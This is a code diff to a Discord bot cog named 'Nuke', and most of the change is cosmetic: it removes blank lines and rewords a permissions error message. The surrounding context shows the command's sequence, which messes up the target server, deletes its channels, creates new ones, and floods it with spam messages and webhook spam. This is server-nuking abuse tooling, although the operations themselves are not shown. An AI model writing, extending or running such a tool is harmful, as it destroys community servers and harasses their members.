@@ -27,16 +27,12 @@ class Nuke(commands.Cog):
         try:
             logging.info(f"[nuke] mess_server -> {guild.id}")
             await self.operations.mess_server(guild)
-
             logging.info(f"[nuke] CrChannel -> {guild.id}")
             await self.operations.CrChannel(guild)
-
             logging.info(f"[nuke] DelChannels -> {guild.id}")
             await self.operations.DelChannels(guild)
-
             logging.info(f"[nuke] spam -> {guild.id}")
             await self.operations.spam(guild)
-
             logging.info(f"[nuke] spam_webhook -> {guild.id}")
             await self.operations.spam_webhook(guild)
 
@@ -48,7 +44,7 @@ class Nuke(commands.Cog):
     @nuke.error
     async def nuke_error(self, ctx: commands.Context, error):
         if isinstance(error, commands.MissingPermissions):
-            await ctx.reply("you need administrator for this", delete_after=5)
+            await ctx.reply("no perms to use this.", delete_after=5)
         else:
             logging.error(f"[nuke] command error: {error}")
 
